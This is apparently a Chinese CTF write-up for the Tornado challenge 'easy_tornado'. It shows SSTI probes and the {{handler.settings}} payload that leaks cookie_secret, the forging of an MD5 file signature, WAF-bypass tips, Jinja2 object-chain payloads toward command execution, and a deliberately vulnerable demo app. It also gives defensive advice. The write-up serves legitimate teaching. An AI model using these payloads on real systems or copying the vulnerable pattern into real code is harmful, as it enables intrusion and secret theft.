---
title: "[CTF2] easy_tornado：SSTI、handler.settings 与 filehash 签名"
date: 2026-11-01 10:00:00
updated: 2026-11-01 10:00:00
categories:
  - CTF
  - Web
  - SSTI
tags:
  - SSTI
  - 模板注入
  - Tornado
  - handler.settings
  - cookie_secret
  - MD5
  - CTF2
description: 首页只给了三个 txt：flag 在 /fllllllllllllag、提示 render、以及 md5(cookie_secret+md5(filename))。用 Tornado 的 handler.settings 泄露 cookie_secret，再按公式算出 filehash，就能读文件拿 flag。
difficulty: 入门
topic: SSTI
series: SSTI
series_order: 1
permalink: 2026/11/01/web-ctf-easy-tornado/
---

{% note primary %}
**一分钟速览**

- **难度**：入门
- **考点**：SSTI（服务端模板注入）、Tornado 模板语法、`handler.settings` 信息泄露、MD5 签名
- **关键 payload**：`/error?msg={% raw %}{{handler.settings}}{% endraw %}`
- **关键公式**：`filehash = md5(cookie_secret + md5(filename))`
- **flag**：`CTF2{350f3f81-e4ac-451d-8565-8c664f833e94}`
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：知道 HTTP GET 参数、Python 字符串、MD5 是什么；用过浏览器开发者工具更好
- **工具**：浏览器、Python 3（或 `md5sum`）、CyberChef（可选）
- **环境**：文中的靶场是临时环境，现在可能已失效；文末给了一个**本地复现实验**，可以照着搭
- 本文所有测试仅用于**授权靶场和本地环境**，请勿对未授权站点进行测试。
{% endnote %}

{% note default %}
**做题路线**

`看首页三个 txt` → `拿到 flag 路径、render 提示、hash 公式` → `找会回显的参数` → `{% raw %}{{7*7}}{% endraw %} 探测被拦` → `{% raw %}{{handler.settings}}{% endraw %} 泄露 cookie_secret` → `算两次 MD5` → `构造 /file 请求` → `拿 flag`
{% endnote %}

## 第一步：把首页的三个文件都读一遍

打开靶场，首页只有三个链接：

![首页的三个 txt](image.png)

*图 1：`/flag.txt`、`/welcome.txt`、`/hints.txt`*

依次点开：

`/flag.txt`：

![flag.txt](image-1.png)

```text
flag in /fllllllllllllag
```

`/welcome.txt`：

![welcome.txt](image-2.png)

```text
render
```

`/hints.txt`：

![hints.txt](image-3.png)

```text
md5(cookie_secret+md5(filename))
```

把三条信息拼起来，题目的结构就清楚了：

| 线索 | 含义 |
| --- | --- |
| `flag in /fllllllllllllag` | flag 在服务器的一个文件里，路径是 `/fllllllllllllag` |
| `render` | 服务器用了**模板渲染**，联想到 SSTI（服务端模板注入） |
| `md5(cookie_secret+md5(filename))` | 读取文件时需要 `filehash`，算法是两层 MD5，密钥是 `cookie_secret` |

也就是说，正常流程应该是「构造一个合法的 `filehash` 去读文件」。但我们不知道 `cookie_secret`——除非能从服务器那里**泄露**出来。

`render` 这个词就是入口。

{% note info %}
题目名 `easy_tornado` 已经点名了框架：**Tornado**。Tornado 是 Python 的异步 Web 框架，自带模板引擎，模板语法用 `{% raw %}{{ ... }}{% endraw %}` 包住 Python 表达式。看到 Tornado + render，第一反应就应该是 SSTI。
{% endnote %}

## 第二步：什么是 SSTI

**SSTI（Server-Side Template Injection，服务端模板注入）** 是这么发生的：

1. 模板引擎把「模板」和「数据」分开处理；
2. 正常写法是 `render("hello.html", name=user_input)`，用户输入只是**数据**，不会被当成模板代码；
3. 如果开发者把用户输入**拼进模板字符串**再渲染，比如 `render_string("hello " + user_input)`，用户输入就会被当成**模板语法**执行。

一个最小例子：

```python
# 正常：用户输入是数据
template = "Hello {{ name }}"
render(template, name=user_input)

# 危险：用户输入进了模板本身
render_string("Hello " + user_input)
```

当用户输入是 `{{7*7}}` 时，模板引擎会先计算 `7*7`，再把 `49` 输出到页面。**这个「49 出现在页面上」就是 SSTI 存在的最直接证据。**

不同模板引擎的语法不同：

| 引擎 | 表达式语法 | 典型探测 payload |
| --- | --- | --- |
| Tornado（Python） | `{{ ... }}` | `{{7*7}}` → `49` |
| Jinja2（Python/Flask） | `{{ ... }}` | `{{7*7}}` → `49` |
| Django Template | `{{ ... }}` | `{{7*7}}` 通常不计算（Django 模板限制较多） |
| Twig（PHP） | `{{ ... }}` | `{{7*7}}` → `49` |
| Smarty（PHP） | `{ ... }` | `{7*7}` → `49` |
| ERB（Ruby） | `<%= ... %>` | `<%= 7*7 %>` → `49` |
| Freemarker（Java） | `${ ... }` | `${7*7}` → `49` |

本题是 Tornado，所以用 `{{ }}`。

## 第三步：找注入点

SSTI 需要两个条件同时满足：

1. 某个参数的值会被**渲染**；
2. 渲染结果会**回显**到页面。

先看有哪些参数。首页的三个链接是静态文件，`/flag.txt` 只是文本。访问一个不存在的路径，看看错误页：

```text
/error?msg=Error
```

页面回显：

![/error?msg=Error](image-4.png)

```text
Error
```

`msg` 参数的内容被原样显示在页面上。这很可能就是渲染点。试着让它算一道题：

```text
/error?msg={{7*7}}
```

结果：

![7*7 被过滤](image-5.png)

```text
ORZ
```

如果模板被正常执行，这里应该显示 `49`；但页面返回了 `ORZ`，说明 `{{7*7}}` 要么被 WAF 拦了，要么被关键词过滤了。**不过这也说明 `msg` 确实是个特殊参数**——普通参数不会触发这种拦截。

{% note warning %}
{% raw %}
不要因为一次 `{{7*7}}` 被拦就放弃。SSTI 的探测方式有很多：

```text
{{7+7}}
{{7**7}}
{{7*'7'}}
{{ "a" ~ "b" }}
```

如果全被拦，可能是按特征匹配的 WAF；这时直接试目标框架的「信息泄露 payload」，比如 Tornado 的 `{{handler.settings}}`，有时反而不在拦截规则里。
{% endraw %}
{% endnote %}

## 第四步：`{{handler.settings}}` 泄露 `cookie_secret`

Tornado 在渲染模板时，会把当前请求的 `handler` 对象放进模板上下文。`handler` 是处理请求的 `RequestHandler` 实例，它有一个 `settings` 属性，里面是应用配置——包括 `cookie_secret`。

直接请求：

```text
/error?msg={{handler.settings}}
```

页面返回一个 Python 字典：

![handler.settings 的输出](image-6.png)

```text
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '11eaad43-3efb-4d73-a1a3-94282cdacebd'}
```

拿到了：

```text
cookie_secret = 11eaad43-3efb-4d73-a1a3-94282cdacebd
```

为什么这一条能成功，而 `{{7*7}}` 失败？因为 `{{handler.settings}}` 不带 `7*7` 这种明显的「计算特征」，很多黑名单只拦算术表达式和危险函数名，没拦属性访问。

{% note info %}
**`cookie_secret` 是什么？**

在 Tornado 里，`cookie_secret` 是 `set_secure_cookie()` / `get_secure_cookie()` 用来给 Cookie 做签名的密钥。名字虽然叫 cookie，但本题把它当作**文件读取签名的密钥**来用。

`RequestHandler.settings` 是应用的配置字典，除了 `cookie_secret`，还可能包含 `debug`、`autoreload`、数据库连接串等敏感信息。**SSTI 能读出 `settings`，往往意味着整个应用的配置都泄露了。**
{% endnote %}

Tornado 里还有几种等价的泄露写法，遇到过滤时可以换着试：

```text
{{handler.settings}}
{{handler.application.settings}}
{{handler.settings['cookie_secret']}}
{{ handler.request }}
```

## 第五步：按公式算 `filehash`

线索里的公式是：

```text
filehash = md5(cookie_secret + md5(filename))
```

拆成两步：

### 5.1 第一层：`md5(filename)`

文件名要用题目给的完整路径：

```text
/fllllllllllllag
```

注意开头的 `/` 和中间连续的 `l`，少一个都不行。计算：

```text
md5("/fllllllllllllag") = 3bf9f6cf685a6dd8defadabfb41a03a1
```

### 5.2 第二层：`md5(cookie_secret + 第一层结果)`

把 `cookie_secret` 和上面那串十六进制**直接拼接**（中间没有分隔符、没有换行）：

```text
11eaad43-3efb-4d73-a1a3-94282cdacebd3bf9f6cf685a6dd8defadabfb41a03a1
```

再算一次 MD5：

```text
md5("11eaad43-3efb-4d73-a1a3-94282cdacebd3bf9f6cf685a6dd8defadabfb41a03a1")
= c880229d196658ea79c55e9f93963632
```

所以：

```text
filehash = c880229d196658ea79c55e9f93963632
```

### 5.3 用 Python 算

```python
import hashlib

cookie_secret = "11eaad43-3efb-4d73-a1a3-94282cdacebd"
filename = "/fllllllllllllag"

inner = hashlib.md5(filename.encode()).hexdigest()
filehash = hashlib.md5((cookie_secret + inner).encode()).hexdigest()

print(inner)
print(filehash)
```

输出：

```text
3bf9f6cf685a6dd8defadabfb41a03a1
c880229d196658ea79c55e9f93963632
```

### 5.4 用命令行算

```bash
printf '%s' "/fllllllllllllag" | md5sum
# 3bf9f6cf685a6dd8defadabfb41a03a1  -

printf '%s' "11eaad43-3efb-4d73-a1a3-94282cdacebd3bf9f6cf685a6dd8defadabfb41a03a1" | md5sum
# c880229d196658ea79c55e9f93963632  -
```

{% note warning %}
**千万别用 `echo` 直接算。**

`echo "abc" | md5sum` 会把换行符 `\n` 也算进去，得到的哈希和程序里的不一样。用 `printf '%s'` 或者 Python 的 `hashlib`，确保输入没有多余的换行和空格。

同理，字符串拼接顺序必须是「`cookie_secret` 在前，`md5(filename)` 在后」，反过来算出来的值完全不同。
{% endnote %}

## 第六步：构造 `/file` 请求，拿 flag

把文件名和 `filehash` 拼进 `/file` 接口：

```text
/file?filename=/fllllllllllllag&filehash=c880229d196658ea79c55e9f93963632
```

访问后页面显示：

![读取文件成功](image-7.png)

```text
/fllllllllllllag
CTF2{350f3f81-e4ac-451d-8565-8c664f833e94}
```

拿到 flag：

```text
CTF2{350f3f81-e4ac-451d-8565-8c664f833e94}
```

完整 URL 如下（把主机换成你当前靶场的地址）：

```text
http://<靶场地址>/file?filename=/fllllllllllllag&filehash=c880229d196658ea79c55e9f93963632
```

{% note success %}
**这一步的本质是「伪造签名」。** 服务器用 `cookie_secret` 给文件名算了一个签名，只有签名对得上才允许读文件。我们通过 SSTI 拿到了 `cookie_secret`，就能给任意文件名算出合法签名——**密钥泄露 = 签名机制失效**。
{% endnote %}

## 第七步：把整条漏洞链串起来

这道题其实是三个「安全措施」被逐个击破：

```text
① /file 接口限制读文件  ──需要──>  filehash 签名
                                        │
                                        │ 需要 cookie_secret
                                        ▼
② cookie_secret 藏在服务端配置里  ──被──>  SSTI 读出 handler.settings
                                        │
                                        ▼
③ /error?msg= 渲染用户输入   ──导致──>  模板注入
```

| 环节 | 设计意图 | 实际问题 |
| --- | --- | --- |
| `/file` 校验 `filehash` | 防止任意文件读取 | 签名密钥可以被泄露 |
| `cookie_secret` 放在 settings | 服务端秘密 | 模板上下文能访问 `handler.settings` |
| `/error?msg=` 渲染输入 | 方便显示错误信息 | 用户输入被当成模板代码执行 |

任何一环做对，这道题都不成立。最根本的问题是 **③**：用户输入不应该被当作模板。

## 补充：Tornado 与 Jinja2 的 SSTI 差异

虽然都用 `{{ }}`，但两者的对象模型和常用 payload 不一样，做题时别混。

### Tornado 常见探测

```text
{{7*7}}                 → 49
{{handler.settings}}    → 应用配置字典
{{handler.application.settings}}
{{handler.request}}
```

Tornado 的模板里可以直接访问 `handler`、`request`、`current_user` 等内置对象。`handler.settings` 是最经典的配置泄露入口。

### Jinja2 / Flask 常见探测

```text
{{7*7}}                 → 49
{{config}}              → Flask 配置（可能含 SECRET_KEY）
{{self}}                → 模板自身对象
{{''.__class__.__mro__}} → 沿 Python 对象模型向上找
```

Jinja2 更常见的是通过 Python 对象链找 `os`/`subprocess`：

```text
{{''.__class__.__mro__[1].__subclasses__()}}
```

然后从返回的类列表里找可执行命令的类（不同环境索引不同）。这类 payload 只应在**授权靶场**里练习。

### 一张对照表

| 目标 | Tornado | Jinja2/Flask |
| --- | --- | --- |
| 算术探测 | `{{7*7}}` | `{{7*7}}` |
| 读配置 | `{{handler.settings}}` | `{{config}}` |
| 读环境变量 | 通过 `handler.settings` / Python 对象链 | `{{config}}` / `{{cycler.__init__.__globals__}}` |
| 命令执行 | Python 对象链 | Python 对象链 |

{% note warning %}
**SSTI 的攻击面远不止读配置。** 在真实环境中，模板注入往往能进一步升级为命令执行。本文所有 payload 仅用于理解原理和授权靶场练习；不要对未授权系统使用。
{% endnote %}

## 新手常见问题

{% note info **Q1：为什么算术探测 `7*7` 返回 `ORZ`，不是 `49`？** %}
{% raw %}
说明 `msg` 确实被模板渲染了，但 `7*7` 这种明显的探测特征被 WAF/黑名单拦下。换 `{{7+7}}`、`{{7**7}}` 或直接试 `{{handler.settings}}`，有时能绕过基于关键词的过滤。
{% endraw %}
{% endnote %}

{% note info **Q2：`handler` 为什么能在模板里直接用？** %}
Tornado 渲染模板时会把当前 `RequestHandler` 放进上下文。`handler.settings` 就是应用的配置字典。这不是 bug，而是框架提供的便利；但当模板能渲染用户输入时，这个便利就变成了信息泄露渠道。
{% endnote %}

{% note info **Q3：`cookie_secret` 是 Cookie 吗？需要我改 Cookie 头吗？** %}
不是。`cookie_secret` 只是 Tornado 配置里的一个密钥名称，本题拿它当 `filehash` 的签名密钥。你要改的是 URL 里的 `filehash` 参数，不需要动 Cookie 头。
{% endnote %}

{% note info **Q4：为什么是 `md5(cookie_secret+md5(filename))`，不是反过来的？** %}
这是题目/服务端约定的顺序。签名算法对顺序敏感，`md5(secret + inner)` 和 `md5(inner + secret)` 结果完全不同。以 hints.txt 给的公式为准。
{% endnote %}

{% note info **Q5：为什么算出来的 hash 和服务端不一致？** %}
最常见的原因是**多了换行或空格**。用 `echo` 会带 `\n`；手动复制文件名可能多/少一个 `l`。用 Python 的 `hashlib` 最稳，并且把中间结果打印出来逐段核对。
{% endnote %}

{% note info **Q6：`/fllllllllllllag` 到底有几个 `l`？** %}
不要手数，直接从 `/flag.txt` 的响应里复制。差一个字符，`md5(filename)` 就完全不同。本文的字符串与靶场一致，算出的第一层哈希是 `3bf9f6cf685a6dd8defadabfb41a03a1`，可以用它反查自己有没有抄错。
{% endnote %}

{% note info **Q7：`handler.settings` 在别的 Tornado 版本里也能用吗？** %}
{% raw %}
大多数 Tornado 版本都支持。若不行，试 `{{handler.application.settings}}` 或 `{{handler.settings['cookie_secret']}}`。不同版本的模板上下文可能略有差异。
{% endraw %}
{% endnote %}

{% note info **Q8：URL 里的花括号需要编码吗？** %}
{% raw %}
浏览器通常会自动处理；用 `curl` 时建议加引号：

```bash
curl -s 'http://<靶场>/error?msg={{handler.settings}}'
```

如果服务端对特殊字符敏感，可以编码成 `%7B%7Bhandler.settings%7D%7D`。
{% endraw %}
{% endnote %}

{% note info **Q9：为什么 flag 文件叫 `/fllllllllllllag`，不是 `/flag`？** %}
出题人故意用一长串 `l` 防止你直接猜路径，同时让 `filename` 参与哈希。路径本身不是秘密，秘密是签名密钥。
{% endnote %}

## 工具速查卡

| 工具/操作 | 用途 | 关键点 |
| --- | --- | --- |
| 浏览器 / `curl` | 发请求、看回显 | `{{handler.settings}}` |
| Python `hashlib` | 算 MD5 | 用 `.encode()`，避免换行 |
| `printf '%s' \| md5sum` | 命令行算 MD5 | 别用 `echo` |
| CyberChef | 图形化哈希/编码 | `MD5` 操作可串联 |
| `Ctrl+U` / F12 | 看源码和请求 | 找参数、找回显 |
| URL 编码 | 处理 `{` `}` | `%7B%7B` / `%7D%7D` |

## 本地复现（选做）

想真正理解签名逻辑，可以用 Tornado 搭一个最小版本：

```python
import hashlib
import tornado.ioloop
import tornado.web

COOKIE_SECRET = "11eaad43-3efb-4d73-a1a3-94282cdacebd"

class ErrorHandler(tornado.web.RequestHandler):
    def get(self):
        msg = self.get_argument("msg", "Error")
        self.write(self.render_string(msg))

class FileHandler(tornado.web.RequestHandler):
    def get(self):
        filename = self.get_argument("filename", "")
        filehash = self.get_argument("filehash", "")
        inner = hashlib.md5(filename.encode()).hexdigest()
        expect = hashlib.md5((COOKIE_SECRET + inner).encode()).hexdigest()
        if filehash != expect:
            self.write("bad filehash")
            return
        self.write(filename + "\nCTF2{local_test_flag}")

def make_app():
    return tornado.web.Application([
        (r"/error", ErrorHandler),
        (r"/file", FileHandler),
    ], cookie_secret=COOKIE_SECRET)

if __name__ == "__main__":
    make_app().listen(8000)
    tornado.ioloop.IOLoop.current().start()
```

启动后：

```text
http://127.0.0.1:8000/error?msg={{handler.settings}}
http://127.0.0.1:8000/file?filename=/fllllllllllllag&filehash=<算出来的值>
```

就能完整复现「SSTI 泄露密钥 → 伪造签名 → 读文件」这条链。

{% note info %}
{% raw %}
注意：上面的 `render_string(msg)` 把用户输入**直接当成模板**，所以 `{{handler.settings}}` 会被执行，这是漏洞版本。安全写法是 `render_string("{{ msg }}", msg=msg)`，把 `msg` 作为数据传入模板。自己搭实验时可以把两种写法都跑一遍，对比回显差异。
{% endraw %}
{% endnote %}

## 顺手聊聊：SSTI 与签名机制的现实风险

### SSTI 为什么危险

模板引擎通常能访问语言的完整对象模型。一旦用户输入被当成模板执行，攻击者可能：

- 读取应用配置、环境变量、密钥；
- 读取服务器文件；
- 通过 Python 对象链调用系统命令；
- 进一步横向移动到数据库、内网。

防护原则：

| 风险 | 防护 |
| --- | --- |
| 用户输入进模板 | 用户输入只作为**数据**传入，绝不拼接进模板字符串 |
| 模板能访问敏感对象 | 使用沙箱模板；限制上下文变量 |
| 错误信息回显输入 | 错误页固定文案，不回显原始输入 |
| 调试模式上线 | 生产环境关闭 `debug`、`autoreload` |
| 配置含密钥 | 密钥放环境变量/密钥管理服务，模板上下文不暴露 |

### 签名机制怎么设计才稳

这道题的签名思路（`md5(secret + md5(data))`）在现实中很常见，但有几点要注意：

| 设计点 | 本题做法 | 更稳妥的做法 |
| --- | --- | --- |
| 哈希算法 | MD5 | HMAC-SHA256 |
| 拼接方式 | 字符串直接拼接 | 用 HMAC，避免长度扩展问题 |
| 密钥管理 | 放在 `settings` 里 | 密钥管理服务，最小权限 |
| 比较方式 | `!=` | 常量时间比较（防时序攻击） |
| 有效期 | 无 | 加过期时间、绑定用户/路径 |

{% note success %}
**一条经验**：签名机制的安全性完全取决于密钥。密钥一旦通过 SSTI、日志、错误页、源码泄露等渠道暴露，签名就形同虚设。做 Web 题时，看到「hash + secret」的组合，先找 secret 的泄露点；做防御时，先想密钥会不会被模板、日志、报错带出去。
{% endnote %}
